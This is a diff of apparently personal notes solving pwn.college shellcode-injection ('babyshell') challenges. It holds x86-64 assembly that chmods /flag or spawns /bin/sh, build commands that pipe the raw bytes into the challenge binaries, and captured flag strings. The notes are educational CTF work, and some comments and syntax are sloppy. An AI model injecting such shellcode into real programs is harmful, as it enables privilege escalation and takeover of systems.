@@ -176,7 +176,8 @@ _start:
 
         # alternate 
         #puts flag value on stack and pushes the stack pointer and places it into rdi
-        mov rcx, 0x462f
+        # 46 -> F , 5A -> Z -> 90
+        #mov rcx, 0x46
         push rcx
         push rsp
         pop rdi
@@ -199,7 +200,11 @@ objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level1
 
-
+gcc -nostdlib -o solve.elf schmod.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
 
 # 2
 # s file
@@ -479,18 +484,32 @@ cat solve.bin | /challenge/babyshell_level7
 .intel_syntax noprefix
 _start:
 
-    # load path Z to register
-    mov cl, 0x5A        # symlink to Z cl -> rcx
+    # load path Z to register  
+    xor rcx, rcx
+    mov cl, 0x5A       # symlink to Z cl -> rcx
 	push rcx            
 	push rsp            # RSP stack pointer
 	pop rdi
 
-   	mov sil, 7          # set perm to 4
+   	mov sil, 0x7          # set perm to 4
     mov al, 90          # chmod syscall
 	syscall
 
+gcc -nostdlib -o solve.elf shellchmod3.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+
 run cat Z
 pwn.college{A_y2Yv8-W_AN4clyzzCpt_2Cv-S.QX0IjMscTOxUzW}
+
+
+gcc -nostdlib -o solve.elf schmod2.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
 
 # 9
 
@@ -500,7 +519,32 @@ gcc -nostdlib -o solve.elf shell12.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
-cat solve.bin | /challenge/babyshell_level8
+cat solve.bin | /challenge/babyshell_level*
+
+
+# 10
+# s file
+.global _start
+.intel_syntax noprefix
+_start:
+
+    # load path f to register
+    xor rcx, rcx
+	mov cl, 0x5A     # symlink to Z
+	push rcx
+	push rsp
+	pop rdi
+
+   	mov sil, 7          # set perm to 4
+    	mov al, 90         # chmod syscall
+	syscall
+
+gcc -nostdlib -o solve.elf shell12.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
+pwn.college{c5iFhV9y_gBxmt_B7rhrEF_fvUv.QX2IjMscTOxUzW}
 
 # 13
 mov al, 90
@@ -518,6 +562,25 @@ lea esi, [rdx]
 push rax
 pop rdi
 syscall
+
+# office hours
+# s file
+.global _start
+.intel_syntax noprefix
+_start:
+#set rdi to 0 (for stdin) -> try setting rdi to 0 with less bytes
+xor rdi, rdi
+
+#set rsi to some mem location -> rdx -> can get rdx to 3 bytes
+mov rsi, rdx
+syscall
+
+
+# file 2
+.rept 100; nop; .endr
+push rsp
+mov rax, 1
+mov rbx, 2
 
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~END OF SOLUTIONS -> NOTES AND SOLUTIONS~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
@@ -618,7 +681,7 @@ _start:
 	pop rdi
 
    	mov rsi, 7          # set perm to 4
-    mov rax, 90         $ chmod syscall
+    mov rax, 90         # chmod syscall
 	syscall
 
 _flag_addr:
@@ -656,7 +719,7 @@ _start:
     mov eax, 90         # chmod syscall -> first arg rax -> eax
 	syscall
 
-gcc -nostdlib -o solve.elf shellchmod3.s
+gcc -nostdlib -o solve.elf shellchmod4.s
 ./solve.elf
 objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
@@ -678,7 +741,6 @@ push 0x61
 push rsp   # very cool - takes only one byte!
 pop rdi  # points towards "a", symlink to "/bin/sh"
 xor rsi, rsi
-
 
 mov al, 59
 cdq  # reset rdx within a single byte!
@@ -849,6 +911,25 @@ objdump -M intel -d solve.elf
 objcopy --dump-section .text=solve.bin solve.elf
 cat solve.bin | /challenge/babyshell_level*
 
+# chmod using lea and /flag
+.global _start
+.intel_syntax noprefix
+_start:
+
+    lea rdi, [rip + _flag_addr]    # symlink to x?
+   	mov rsi, 7          # set perm to 4
+    mov rax, 90         $ chmod syscall
+	syscall
+
+_flag_addr:
+	.ascii "/flag"
+
+
+gcc -nostdlib -o solve.elf shellchmodlea.s
+./solve.elf
+objdump -M intel -d solve.elf
+objcopy --dump-section .text=solve.bin solve.elf
+cat solve.bin | /challenge/babyshell_level*
 
 #chmodding flag
 mov rbx, 0x00000067616c662f  # /flag
